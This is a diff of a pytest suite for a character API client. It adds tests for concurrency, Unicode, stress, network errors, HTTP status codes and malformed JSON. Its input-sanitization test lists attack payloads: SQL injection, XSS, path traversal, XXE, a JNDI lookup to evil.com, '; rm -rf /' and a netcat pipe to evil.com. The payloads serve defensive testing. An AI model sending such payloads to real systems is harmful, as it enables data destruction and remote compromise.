@@ -679,674 +679,1006 @@ class TestCharacterClientConfiguration:
 if __name__ == '__main__':
     pytest.main([__file__, '-v'])
 
-# Additional Comprehensive Test Coverage
+# ================================================================================================
+# ADDITIONAL COMPREHENSIVE TEST COVERAGE - ADVANCED SCENARIOS
+# Testing Framework: pytest with extensive mocking and parameterization
+# ================================================================================================
+
 class TestCharacterClientAdvancedScenarios:
     """
-    Advanced test scenarios for CharacterClient covering edge cases and additional functionality.
+    Advanced test scenarios for CharacterClient focusing on edge cases, concurrency,
+    performance, security, and complex error scenarios.
     Testing framework: pytest
     """
 
     @pytest.fixture
-    def client_no_auth(self):
-        """Fixture for client without authentication."""
-        return CharacterClient(base_url="https://api.test.com")
+    def client_with_custom_session(self):
+        """Fixture to create a CharacterClient with custom session configuration."""
+        client = CharacterClient(base_url="https://api.test.com", api_key="test_key")
+        # Simulate custom session configuration
+        client.session.headers.update({
+            "User-Agent": "CharacterClient-Test/1.0",
+            "Accept-Language": "en-US,en;q=0.9"
+        })
+        return client
 
     @pytest.fixture
-    def malformed_character_data(self):
-        """Fixture with various malformed character data for testing."""
-        return [
-            {"name": " ", "class": "Warrior"},  # Whitespace-only name
-            {"name": "A" * 1000, "class": "Mage"},  # Extremely long name
-            {"name": "Test", "class": ""},  # Empty class
-            {"name": "Test", "class": None},  # None class
-            {"name": "Test", "level": -1},  # Negative level
-            {"name": "Test", "level": "invalid"},  # String level
-            {"name": "Test\n\t", "class": "War\x00rior"},  # Special characters
-        ]
-
-    # Extended HTTP Status Code Testing
-    @pytest.mark.parametrize("status_code,expected_error", [
-        (400, "400 Bad Request"),
-        (401, "401 Unauthorized"), 
-        (403, "403 Forbidden"),
-        (404, "404 Not Found"),
-        (405, "405 Method Not Allowed"),
-        (409, "409 Conflict"),
-        (410, "410 Gone"),
-        (422, "422 Unprocessable Entity"),
-        (429, "429 Too Many Requests"),
-        (500, "500 Internal Server Error"),
-        (502, "502 Bad Gateway"),
-        (503, "503 Service Unavailable"),
-        (504, "504 Gateway Timeout"),
-    ])
-    @patch('requests.Session.get')
-    def test_http_error_codes_get_character(self, mock_get, client, status_code, expected_error):
-        """Test various HTTP error codes for get_character."""
-        mock_response = Mock()
-        mock_response.status_code = status_code
-        mock_response.raise_for_status.side_effect = HTTPError(expected_error)
-        mock_get.return_value = mock_response
-
-        with pytest.raises(HTTPError, match=str(status_code)):
-            client.get_character(1)
-
-    # Pagination Edge Cases
-    @pytest.mark.parametrize("page,limit,expected_params", [
-        (0, 20, {"page": 0, "limit": 20}),  # Zero page
-        (1, 0, {"page": 1, "limit": 0}),    # Zero limit
-        (999999, 1, {"page": 999999, "limit": 1}),  # Very large page
-        (1, 10000, {"page": 1, "limit": 10000}),    # Very large limit
-        (-1, 20, {"page": -1, "limit": 20}),        # Negative page
-        (1, -1, {"page": 1, "limit": -1}),          # Negative limit
-    ])
-    @patch('requests.Session.get')
-    def test_get_all_characters_edge_case_pagination(self, mock_get, client, page, limit, expected_params):
-        """Test pagination with edge case values."""
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = []
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        result = client.get_all_characters(page=page, limit=limit)
-        
-        assert result == []
-        mock_get.assert_called_once_with(
-            "https://api.test.com/characters", 
-            params=expected_params, 
-            timeout=30
-        )
-
-    # URL Construction Edge Cases
-    @pytest.mark.parametrize("base_url,expected_url", [
-        ("https://api.test.com", "https://api.test.com"),
-        ("https://api.test.com/", "https://api.test.com"),
-        ("https://api.test.com//", "https://api.test.com/"),
-        ("https://api.test.com/v1", "https://api.test.com/v1"),
-        ("https://api.test.com/v1/", "https://api.test.com/v1"),
-        ("http://localhost:8080", "http://localhost:8080"),
-        ("http://localhost:8080/", "http://localhost:8080"),
-    ])
-    def test_url_construction_edge_cases(self, base_url, expected_url):
-        """Test URL construction with various base URL formats."""
-        client = CharacterClient(base_url=base_url)
-        assert client.base_url == expected_url
-
-    # Complex Character Data Validation
-    @pytest.mark.parametrize("character_data", [
-        {"name": "Test", "class": "Warrior", "stats": {"invalid": "data"}},
-        {"name": "Test", "class": "Warrior", "nested": {"deeply": {"nested": {"data": True}}}},
-        {"name": "Test", "class": "Warrior", "unicode": "Test 🧙‍♂️ Character"},
-        {"name": "Test", "class": "Warrior", "special_chars": "Test@#$%^&*()"},
-        {"name": "Test", "class": "Warrior", "numbers": 12345},
-        {"name": "Test", "class": "Warrior", "boolean": True},
-        {"name": "Test", "class": "Warrior", "null_value": None},
-    ])
-    @patch('requests.Session.post')
-    def test_create_character_complex_data_types(self, mock_post, client, character_data):
-        """Test character creation with complex data types."""
-        mock_response = Mock()
-        mock_response.status_code = 201
-        mock_response.json.return_value = character_data
-        mock_response.raise_for_status.return_value = None
-        mock_post.return_value = mock_response
-
-        result = client.create_character(character_data)
-        
-        assert result == character_data
-        mock_post.assert_called_once_with(
-            "https://api.test.com/characters", 
-            json=character_data, 
-            timeout=30
-        )
-
-    # Session Management Tests
-    def test_session_persistence(self):
-        """Test that session is reused across requests."""
-        client = CharacterClient(api_key="test_key")
-        session_id = id(client.session)
-        
-        # Session should be the same object
-        assert id(client.session) == session_id
-
-    def test_session_headers_modification(self):
-        """Test session header modifications."""
-        client = CharacterClient()
-        original_headers = dict(client.session.headers)
-        
-        # Add custom header
-        client.session.headers.update({"Custom-Header": "test_value"})
-        
-        assert "Custom-Header" in client.session.headers
-        assert client.session.headers["Custom-Header"] == "test_value"
-
-    # Mock Verification Tests
-    @patch('requests.Session.get')
-    def test_get_character_mock_call_verification(self, mock_get, client):
-        """Test detailed mock call verification for get_character."""
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = {"id": 1, "name": "Test"}
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        client.get_character(1)
-        
-        # Verify mock was called exactly once
-        assert mock_get.call_count == 1
-        
-        # Verify call arguments
-        args, kwargs = mock_get.call_args
-        assert args == ("https://api.test.com/characters/1",)
-        assert kwargs == {"timeout": 30}
-        
-        # Verify response methods were called
-        mock_response.raise_for_status.assert_called_once()
-        mock_response.json.assert_called_once()
-
-    # Content-Type and Header Tests
-    @patch('requests.Session.post')
-    def test_create_character_request_headers(self, mock_post, client):
-        """Test that create_character sends correct headers."""
-        mock_response = Mock()
-        mock_response.status_code = 201
-        mock_response.json.return_value = {"id": 1}
-        mock_response.raise_for_status.return_value = None
-        mock_post.return_value = mock_response
-
-        character_data = {"name": "Test", "class": "Warrior"}
-        client.create_character(character_data)
-        
-        # Verify the request was made with JSON data
-        mock_post.assert_called_once_with(
-            "https://api.test.com/characters", 
-            json=character_data, 
-            timeout=30
-        )
-
-    # Response Content Validation
-    @patch('requests.Session.get')
-    def test_get_character_response_structure_validation(self, mock_get, client):
-        """Test response structure validation for get_character."""
-        # Test with various response structures
-        response_data = {
-            "id": 1,
-            "name": "Test Character",
-            "class": "Warrior",
-            "level": 10,
-            "stats": {
-                "strength": 15,
-                "dexterity": 12
-            },
-            "created_at": "2023-01-01T00:00:00Z",
-            "updated_at": "2023-01-01T00:00:00Z"
-        }
-        
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = response_data
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        result = client.get_character(1)
-        
-        # Validate response structure
-        assert isinstance(result, dict)
-        assert "id" in result
-        assert "name" in result
-        assert isinstance(result["stats"], dict)
-        assert result == response_data
-
-    # Search Function Edge Cases
-    @pytest.mark.parametrize("search_params,expected_params", [
-        ({"name": ""}, {"name": ""}),  # Empty string
-        ({"name": " "}, {"name": " "}),  # Whitespace
-        ({"character_class": " "}, {"class": " "}),  # Whitespace class
-        ({"level_min": 0}, {"level_min": 0}),  # Zero level
-        ({"level_max": 0}, {"level_max": 0}),  # Zero max level
-        ({"name": "Test", "character_class": "Warrior", "level_min": 1, "level_max": 100}, 
-         {"name": "Test", "class": "Warrior", "level_min": 1, "level_max": 100}),
-    ])
-    @patch('requests.Session.get')
-    def test_search_characters_parameter_mapping(self, mock_get, client, search_params, expected_params):
-        """Test parameter mapping in search_characters."""
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = []
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        client.search_characters(**search_params)
-        
-        mock_get.assert_called_once_with(
-            "https://api.test.com/characters/search", 
-            params=expected_params, 
-            timeout=30
-        )
-
-    # Concurrent Request Simulation
-    @patch('requests.Session.get')
-    def test_multiple_concurrent_requests(self, mock_get, client):
-        """Test handling of multiple concurrent-style requests."""
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = {"id": 1, "name": "Test"}
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        # Simulate multiple requests
-        results = []
-        for i in range(1, 6):
-            result = client.get_character(i)
-            results.append(result)
-        
-        assert len(results) == 5
-        assert mock_get.call_count == 5
-        
-        # Verify each call was made with different character IDs
-        expected_calls = [
-            call(f"https://api.test.com/characters/{i}", timeout=30) 
-            for i in range(1, 6)
-        ]
-        mock_get.assert_has_calls(expected_calls)
-
-    # Empty and Null Response Handling
-    @pytest.mark.parametrize("response_data", [
-        {},  # Empty dict
-        [],  # Empty list (shouldn't happen for single character, but test anyway)
-        None,  # None response (would cause JSON decode error in real scenario)
-    ])
-    @patch('requests.Session.get')
-    def test_get_character_empty_responses(self, mock_get, client, response_data):
-        """Test handling of empty or null responses."""
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = response_data
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        result = client.get_character(1)
-        assert result == response_data
-
-    # Delete Operation Edge Cases
-    @pytest.mark.parametrize("status_code,expected_return", [
-        (204, True),   # Standard success
-        (200, False),  # OK but not 204
-        (202, False),  # Accepted but not 204
-    ])
-    @patch('requests.Session.delete')
-    def test_delete_character_status_code_handling(self, mock_delete, client, status_code, expected_return):
-        """Test delete character with various success status codes."""
-        mock_response = Mock()
-        mock_response.status_code = status_code
-        mock_response.raise_for_status.return_value = None
-        mock_delete.return_value = mock_response
-
-        result = client.delete_character(1)
-        assert result == expected_return
-
-    # Large Data Handling
-    @patch('requests.Session.post')
-    def test_create_character_large_data(self, mock_post, client):
-        """Test character creation with large data payload."""
-        large_character_data = {
-            "name": "Test Character",
-            "class": "Warrior",
-            "level": 1,
-            "description": "A" * 10000,  # Large description
-            "inventory": [{"item": f"Item {i}", "quantity": i} for i in range(100)],
-            "stats": {f"stat_{i}": i for i in range(50)},
-            "metadata": {
-                "large_field": "B" * 5000,
-                "nested_data": {
-                    "deep_field": "C" * 3000
+    def stress_test_data(self):
+        """Fixture providing large datasets for stress testing."""
+        return {
+            "large_character_list": [
+                {
+                    "id": i,
+                    "name": f"StressTest Character {i}",
+                    "class": ["Warrior", "Mage", "Rogue", "Paladin"][i % 4],
+                    "level": (i % 100) + 1,
+                    "stats": {
+                        "strength": (i % 20) + 5,
+                        "dexterity": (i % 20) + 5,
+                        "intelligence": (i % 20) + 5,
+                        "constitution": (i % 20) + 5
+                    }
                 }
+                for i in range(1, 1001)  # 1000 characters
+            ],
+            "deep_nested_character": {
+                "id": 1,
+                "name": "Deeply Nested Character",
+                "inventory": {
+                    "weapons": {
+                        "primary": {
+                            "name": "Legendary Sword",
+                            "enchantments": {
+                                "fire": {"damage": 10, "duration": 5},
+                                "ice": {"damage": 8, "slow": True}
+                            }
+                        }
+                    }
+                },
+                "guilds": [
+                    {"name": f"Guild {i}", "rank": f"Rank {i}", "members": list(range(100))}
+                    for i in range(50)
+                ]
             }
         }
-        
-        mock_response = Mock()
-        mock_response.status_code = 201
-        mock_response.json.return_value = large_character_data
-        mock_response.raise_for_status.return_value = None
-        mock_post.return_value = mock_response
 
-        result = client.create_character(large_character_data)
-        
-        assert result == large_character_data
-        mock_post.assert_called_once_with(
-            "https://api.test.com/characters", 
-            json=large_character_data, 
-            timeout=30
-        )
+    # =============================================================================================
+    # CONCURRENCY AND THREAD SAFETY TESTS
+    # =============================================================================================
 
-    # API Key Security Tests
-    def test_api_key_not_logged_or_exposed(self):
-        """Test that API key is not exposed in string representations."""
-        api_key = "super_secret_api_key"
-        client = CharacterClient(api_key=api_key)
-        
-        # API key should not appear in string representation
-        client_str = str(client.__dict__)
-        assert api_key not in client_str or "Bearer" not in client_str
-
-    # Timeout Configuration Edge Cases
-    @pytest.mark.parametrize("timeout_value", [0, 0.1, 1, 60, 300, 3600])
-    def test_timeout_configuration_values(self, timeout_value):
-        """Test various timeout configuration values."""
-        client = CharacterClient(timeout=timeout_value)
-        assert client.timeout == timeout_value
-
-    # Character ID Boundary Testing
-    @pytest.mark.parametrize("character_id", [
-        1,           # Minimum valid ID
-        2147483647,  # Max 32-bit integer
-        9223372036854775807,  # Max 64-bit integer
-    ])
     @patch('requests.Session.get')
-    def test_get_character_id_boundaries(self, mock_get, client, character_id):
-        """Test character retrieval with boundary ID values."""
+    def test_concurrent_character_requests_thread_safety(self, mock_get, client, sample_character):
+        """Test thread safety with high concurrency character requests."""
+        import threading
+        import time
+        from concurrent.futures import ThreadPoolExecutor
+        
         mock_response = Mock()
         mock_response.status_code = 200
-        mock_response.json.return_value = {"id": character_id, "name": "Test"}
+        mock_response.json.return_value = sample_character
         mock_response.raise_for_status.return_value = None
         mock_get.return_value = mock_response
 
-        result = client.get_character(character_id)
+        results = []
+        errors = []
         
-        assert result["id"] == character_id
-        mock_get.assert_called_once_with(
-            f"https://api.test.com/characters/{character_id}", 
-            timeout=30
-        )
+        def fetch_character(char_id):
+            try:
+                start_time = time.time()
+                result = client.get_character(char_id)
+                end_time = time.time()
+                results.append({
+                    "character": result,
+                    "duration": end_time - start_time,
+                    "thread_id": threading.current_thread().ident
+                })
+            except Exception as e:
+                errors.append((char_id, e, threading.current_thread().ident))
 
-    # Update Operation Comprehensive Testing
-    @pytest.mark.parametrize("update_data", [
-        {"level": 2},  # Single field update
-        {"level": 2, "name": "Updated Name"},  # Multiple field update
-        {"stats": {"strength": 20}},  # Nested object update
-        {"inventory": [{"item": "sword", "quantity": 1}]},  # Array update
+        # Test with 50 concurrent threads
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(fetch_character, i) for i in range(1, 101)]
+            for future in futures:
+                future.result()  # Wait for completion
+
+        # Verify results
+        assert len(results) == 100
+        assert len(errors) == 0
+        assert len(set(r["thread_id"] for r in results)) > 1  # Multiple threads used
+        assert mock_get.call_count == 100
+
+    @patch('requests.Session.post')
+    @patch('requests.Session.get')
+    def test_mixed_operations_concurrency(self, mock_get, mock_post, client, sample_character):
+        """Test concurrent mixed operations (create, read, update)."""
+        import threading
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        
+        # Setup mocks
+        mock_get_response = Mock()
+        mock_get_response.status_code = 200
+        mock_get_response.json.return_value = sample_character
+        mock_get_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_get_response
+
+        mock_post_response = Mock()
+        mock_post_response.status_code = 201
+        mock_post_response.json.return_value = sample_character
+        mock_post_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_post_response
+
+        operations_completed = []
+        operation_errors = []
+
+        def perform_operations(operation_id):
+            try:
+                # Create a character
+                create_result = client.create_character({
+                    "name": f"Concurrent Character {operation_id}",
+                    "class": "Warrior"
+                })
+                operations_completed.append(f"create_{operation_id}")
+                
+                # Read characters
+                read_result = client.get_character(operation_id)
+                operations_completed.append(f"read_{operation_id}")
+                
+                return {"create": create_result, "read": read_result}
+            except Exception as e:
+                operation_errors.append((operation_id, str(e)))
+                raise
+
+        # Execute 20 concurrent mixed operations
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(perform_operations, i) for i in range(1, 21)]
+            results = []
+            for future in as_completed(futures):
+                try:
+                    results.append(future.result())
+                except Exception as e:
+                    operation_errors.append(("future", str(e)))
+
+        # Verify all operations completed successfully
+        assert len(results) == 20
+        assert len(operation_errors) == 0
+        assert len(operations_completed) == 40  # 20 creates + 20 reads
+
+    # =============================================================================================
+    # UNICODE, ENCODING, AND INTERNATIONALIZATION TESTS  
+    # =============================================================================================
+
+    @pytest.mark.parametrize("unicode_name,expected_class", [
+        ("龍の戦士", "Samurai"),  # Japanese
+        ("Señor Héroe", "Paladin"),  # Spanish with accents
+        ("Рыцарь Света", "Knight"),  # Russian Cyrillic
+        ("🗡️⚔️ Warrior", "Fighter"),  # Emoji characters
+        ("Åse Bjørn", "Viking"),  # Nordic characters
+        ("محارب الصحراء", "Desert Warrior"),  # Arabic
+        ("Ελληνικός ήρωας", "Greek Hero"),  # Greek
     ])
-    @patch('requests.Session.put')
-    def test_update_character_various_data_types(self, mock_put, client, update_data):
-        """Test character update with various data types."""
-        updated_character = {"id": 1, "name": "Test", **update_data}
+    @patch('requests.Session.post')
+    def test_unicode_character_creation(self, mock_post, client, unicode_name, expected_class):
+        """Test character creation with various Unicode character sets."""
+        unicode_character = {
+            "id": 1,
+            "name": unicode_name,
+            "class": expected_class,
+            "level": 1
+        }
+        
+        mock_response = Mock()
+        mock_response.status_code = 201
+        mock_response.json.return_value = unicode_character
+        mock_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_response
+
+        character_data = {"name": unicode_name, "class": expected_class, "level": 1}
+        result = client.create_character(character_data)
+        
+        assert result["name"] == unicode_name
+        assert result["class"] == expected_class
+        mock_post.assert_called_once()
+
+    @patch('requests.Session.get')
+    def test_search_with_complex_unicode_queries(self, mock_get, client):
+        """Test character search with complex Unicode search queries."""
+        unicode_results = [
+            {"id": 1, "name": "Drácula", "class": "Vampire"},
+            {"id": 2, "name": "Fürst", "class": "Noble"},
+            {"id": 3, "name": "Ætheling", "class": "Royal"}
+        ]
         
         mock_response = Mock()
         mock_response.status_code = 200
-        mock_response.json.return_value = updated_character
+        mock_response.json.return_value = unicode_results
         mock_response.raise_for_status.return_value = None
-        mock_put.return_value = mock_response
+        mock_get.return_value = mock_response
 
-        result = client.update_character(1, update_data)
-        
-        assert result == updated_character
-        mock_put.assert_called_once_with(
-            "https://api.test.com/characters/1", 
-            json=update_data, 
-            timeout=30
-        )
-
-    # Malformed Data Testing
-    def test_create_character_malformed_data_validation(self, client, malformed_character_data):
-        """Test character creation with various malformed data inputs."""
-        for bad_data in malformed_character_data:
-            with pytest.raises(ValueError, match="Invalid character data"):
-                client.create_character(bad_data)
-
-    # Network Resilience Testing
-    @patch('requests.Session.get')
-    def test_network_error_types(self, mock_get, client):
-        """Test various network error scenarios."""
-        network_errors = [
-            ConnectionError("Connection refused"),
-            Timeout("Request timeout"),
-            RequestException("Generic request error"),
+        # Test with various Unicode search patterns
+        unicode_queries = [
+            "Drác",  # Partial match with accent
+            "ür",    # German umlaut
+            "Æ",     # Old English character
         ]
-        
-        for error in network_errors:
-            mock_get.side_effect = error
-            
-            with pytest.raises(type(error)):
-                client.get_character(1)
-            
-            mock_get.reset_mock()
 
-    # Response Time Simulation
+        for query in unicode_queries:
+            result = client.search_characters(name=query)
+            assert isinstance(result, list)
+            assert len(result) == 3
+
+    # =============================================================================================
+    # PERFORMANCE AND STRESS TESTING
+    # =============================================================================================
+
     @patch('requests.Session.get')
-    def test_simulated_slow_response(self, mock_get, client):
-        """Test handling of slow response simulation."""
+    def test_large_response_handling(self, mock_get, client, stress_test_data):
+        """Test handling of very large API responses."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = stress_test_data["large_character_list"]
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
         import time
-        
-        def slow_response(*args, **kwargs):
-            time.sleep(0.1)  # Simulate network delay
-            mock_response = Mock()
-            mock_response.status_code = 200
-            mock_response.json.return_value = {"id": 1, "name": "Test"}
-            mock_response.raise_for_status.return_value = None
-            return mock_response
-        
-        mock_get.side_effect = slow_response
-        
         start_time = time.time()
-        result = client.get_character(1)
+        result = client.get_all_characters(limit=1000)
         end_time = time.time()
         
-        assert result["id"] == 1
-        assert end_time - start_time >= 0.1  # Verify delay occurred
+        # Verify large response handling
+        assert len(result) == 1000
+        assert result[0]["id"] == 1
+        assert result[999]["id"] == 1000
+        
+        # Performance should be reasonable even for large responses
+        processing_time = end_time - start_time
+        assert processing_time < 5.0  # Should process within 5 seconds
+
+    @patch('requests.Session.get')
+    def test_deeply_nested_data_handling(self, mock_get, client, stress_test_data):
+        """Test handling of deeply nested character data structures."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = stress_test_data["deep_nested_character"]
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        result = client.get_character(1)
+        
+        # Verify deep nesting is preserved
+        assert result["inventory"]["weapons"]["primary"]["name"] == "Legendary Sword"
+        assert result["inventory"]["weapons"]["primary"]["enchantments"]["fire"]["damage"] == 10
+        assert len(result["guilds"]) == 50
+        assert len(result["guilds"][0]["members"]) == 100
+
+    @patch('requests.Session.get')
+    def test_rapid_sequential_requests_performance(self, mock_get, client, sample_character):
+        """Test performance characteristics of rapid sequential requests."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = sample_character
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        import time
+        
+        # Measure time for 500 rapid requests
+        start_time = time.time()
+        results = []
+        for i in range(500):
+            result = client.get_character(i + 1)
+            results.append(result)
+        end_time = time.time()
+        
+        # Verify results and performance
+        assert len(results) == 500
+        assert all(r == sample_character for r in results)
+        
+        total_time = end_time - start_time
+        avg_time_per_request = total_time / 500
+        
+        # Performance expectations (these should be very fast with mocks)
+        assert total_time < 10.0  # Total time under 10 seconds
+        assert avg_time_per_request < 0.02  # Average under 20ms per request
+
+    # =============================================================================================
+    # SECURITY AND INPUT VALIDATION TESTS
+    # =============================================================================================
+
+    @pytest.mark.parametrize("malicious_payload", [
+        # SQL Injection attempts
+        {"name": "'; DROP TABLE characters; --"},
+        {"name": "admin'--"},
+        {"name": "' OR '1'='1"},
+        {"class": "' UNION SELECT * FROM users --"},
+        
+        # XSS attempts
+        {"name": "<script>alert('xss')</script>"},
+        {"description": "<img src=x onerror=alert('xss')>"},
+        {"class": "javascript:alert('xss')"},
+        
+        # Path traversal attempts
+        {"name": "../../../etc/passwd"},
+        {"avatar_url": "file:///etc/shadow"},
+        
+        # Template injection attempts
+        {"name": "{{7*7}}"},
+        {"description": "${jndi:ldap://evil.com/a}"},
+        {"class": "#{7*7}"},
+        
+        # Command injection attempts
+        {"name": "; rm -rf /"},
+        {"description": "| nc evil.com 4444"},
+        
+        # XXE attempts
+        {"bio": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"},
+        
+        # Buffer overflow attempts
+        {"name": "A" * 10000},
+        {"description": "B" * 50000},
+    ])
+    @patch('requests.Session.post')
+    def test_malicious_input_sanitization(self, mock_post, client, malicious_payload):
+        """Test that malicious inputs are handled safely without causing security issues."""
+        # Mock server response (assuming server handles sanitization)
+        sanitized_payload = {k: f"SANITIZED_{v}" if isinstance(v, str) else v for k, v in malicious_payload.items()}
+        sanitized_payload["id"] = 1
+        
+        mock_response = Mock()
+        mock_response.status_code = 201
+        mock_response.json.return_value = sanitized_payload
+        mock_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_response
+
+        # Should not crash or cause security issues
+        try:
+            result = client.create_character(malicious_payload)
+            assert result["id"] == 1
+            # Verify the request was made (client doesn't crash)
+            mock_post.assert_called_once()
+        except (ValueError, TypeError) as e:
+            # Acceptable to reject obviously invalid input
+            assert "Invalid" in str(e)
+
+    @pytest.mark.parametrize("oversized_data", [
+        {"name": "X" * 1000000},  # 1MB name
+        {"description": "Y" * 5000000},  # 5MB description
+        {"inventory": [{"item": f"item_{i}"} for i in range(100000)]},  # 100k items
+    ])
+    def test_oversized_data_handling(self, client, oversized_data):
+        """Test handling of oversized data that could cause memory issues."""
+        with patch('requests.Session.post') as mock_post:
+            # Mock a server response or error for oversized data
+            mock_response = Mock()
+            mock_response.status_code = 413  # Payload Too Large
+            mock_response.raise_for_status.side_effect = HTTPError("413 Payload Too Large")
+            mock_post.return_value = mock_response
+
+            with pytest.raises(HTTPError, match="413"):
+                client.create_character(oversized_data)
+
+    # =============================================================================================
+    # NETWORK ERROR SIMULATION AND RECOVERY TESTS
+    # =============================================================================================
+
+    @pytest.mark.parametrize("network_error", [
+        ConnectionError("Network is unreachable"),
+        Timeout("Read timeout"),
+        requests.exceptions.ChunkedEncodingError("Connection broken: Invalid chunk encoding"),
+        requests.exceptions.SSLError("SSL certificate verification failed"),
+        requests.exceptions.ProxyError("Proxy error"),
+        requests.exceptions.TooManyRedirects("Too many redirects"),
+        requests.exceptions.ContentDecodingError("Failed to decode response content"),
+    ])
+    @patch('requests.Session.get')
+    def test_comprehensive_network_error_handling(self, mock_get, client, network_error):
+        """Test handling of various network-related errors."""
+        mock_get.side_effect = network_error
+        
+        with pytest.raises(type(network_error)):
+            client.get_character(1)
+
+    @patch('requests.Session.get')
+    def test_intermittent_network_failures(self, mock_get, client, sample_character):
+        """Test behavior with intermittent network failures."""
+        # Simulate intermittent failures: fail, succeed, fail, succeed
+        failure = ConnectionError("Intermittent failure")
+        success_response = Mock()
+        success_response.status_code = 200
+        success_response.json.return_value = sample_character
+        success_response.raise_for_status.return_value = None
+        
+        mock_get.side_effect = [failure, success_response, failure, success_response]
+        
+        # First request fails
+        with pytest.raises(ConnectionError):
+            client.get_character(1)
+        
+        # Second request succeeds
+        result = client.get_character(1)
+        assert result == sample_character
+        
+        # Third request fails again
+        with pytest.raises(ConnectionError):
+            client.get_character(1)
+        
+        # Fourth request succeeds again
+        result = client.get_character(1)
+        assert result == sample_character
+
+    # =============================================================================================
+    # HTTP PROTOCOL AND STATUS CODE EDGE CASES
+    # =============================================================================================
+
+    @pytest.mark.parametrize("status_code,error_class", [
+        (100, HTTPError),  # Continue
+        (102, HTTPError),  # Processing
+        (300, HTTPError),  # Multiple Choices
+        (301, HTTPError),  # Moved Permanently
+        (307, HTTPError),  # Temporary Redirect
+        (308, HTTPError),  # Permanent Redirect
+        (400, HTTPError),  # Bad Request
+        (402, HTTPError),  # Payment Required
+        (405, HTTPError),  # Method Not Allowed
+        (406, HTTPError),  # Not Acceptable
+        (408, HTTPError),  # Request Timeout
+        (409, HTTPError),  # Conflict
+        (410, HTTPError),  # Gone
+        (412, HTTPError),  # Precondition Failed
+        (413, HTTPError),  # Payload Too Large
+        (414, HTTPError),  # URI Too Long
+        (415, HTTPError),  # Unsupported Media Type
+        (417, HTTPError),  # Expectation Failed
+        (418, HTTPError),  # I'm a teapot
+        (422, HTTPError),  # Unprocessable Entity
+        (423, HTTPError),  # Locked
+        (424, HTTPError),  # Failed Dependency
+        (426, HTTPError),  # Upgrade Required
+        (428, HTTPError),  # Precondition Required
+        (429, HTTPError),  # Too Many Requests
+        (431, HTTPError),  # Request Header Fields Too Large
+        (451, HTTPError),  # Unavailable For Legal Reasons
+        (500, HTTPError),  # Internal Server Error
+        (501, HTTPError),  # Not Implemented
+        (502, HTTPError),  # Bad Gateway
+        (503, HTTPError),  # Service Unavailable
+        (504, HTTPError),  # Gateway Timeout
+        (505, HTTPError),  # HTTP Version Not Supported
+        (507, HTTPError),  # Insufficient Storage
+        (508, HTTPError),  # Loop Detected
+        (510, HTTPError),  # Not Extended
+        (511, HTTPError),  # Network Authentication Required
+    ])
+    @patch('requests.Session.get')
+    def test_comprehensive_http_status_codes(self, mock_get, client, status_code, error_class):
+        """Test handling of comprehensive HTTP status codes."""
+        mock_response = Mock()
+        mock_response.status_code = status_code
+        mock_response.raise_for_status.side_effect = HTTPError(f"{status_code} Error")
+        mock_get.return_value = mock_response
+
+        with pytest.raises(error_class):
+            client.get_character(1)
+
+    # =============================================================================================
+    # JSON AND DATA FORMAT EDGE CASES
+    # =============================================================================================
+
+    @pytest.mark.parametrize("malformed_json", [
+        '{"id": 1, "name": "test"',  # Missing closing brace
+        '{"id": 1, "name": "test"}}',  # Extra closing brace
+        '{"id": 1, "name": "test",}',  # Trailing comma
+        '{"id": 1, "name": test}',  # Unquoted string
+        '{id: 1, name: "test"}',  # Unquoted keys
+        '{"id": 01, "name": "test"}',  # Leading zero in number
+        '{"id": 1, "name": "\u"}',  # Invalid unicode escape
+        '{"id": 1, "name": "test"]\n',  # Mixed brackets
+        '',  # Empty response
+        'null',  # Null response
+        'undefined',  # Undefined response
+        '[]',  # Array instead of object
+        'true',  # Boolean response
+        '42',  # Number response
+    ])
+    @patch('requests.Session.get')
+    def test_malformed_json_responses(self, mock_get, client, malformed_json):
+        """Test handling of various malformed JSON responses."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.raise_for_status.return_value = None
+        mock_response.text = malformed_json
+        
+        # Simulate JSON decoding error for malformed JSON
+        if malformed_json in ['', 'null', 'undefined', '[]', 'true', '42']:
+            if malformed_json == '[]':
+                mock_response.json.return_value = []
+            elif malformed_json == 'null':
+                mock_response.json.return_value = None
+            elif malformed_json == 'true':
+                mock_response.json.return_value = True
+            elif malformed_json == '42':
+                mock_response.json.return_value = 42
+            else:
+                mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", malformed_json, 0)
+        else:
+            mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", malformed_json, 0)
+        
+        mock_get.return_value = mock_response
+
+        if malformed_json in ['[]', 'true', '42']:
+            # These should not raise JSON errors but may return unexpected data
+            result = client.get_character(1)
+            assert result is not None
+        elif malformed_json == 'null':
+            result = client.get_character(1)
+            assert result is None
+        else:
+            with pytest.raises(json.JSONDecodeError):
+                client.get_character(1)
+
+    # =============================================================================================
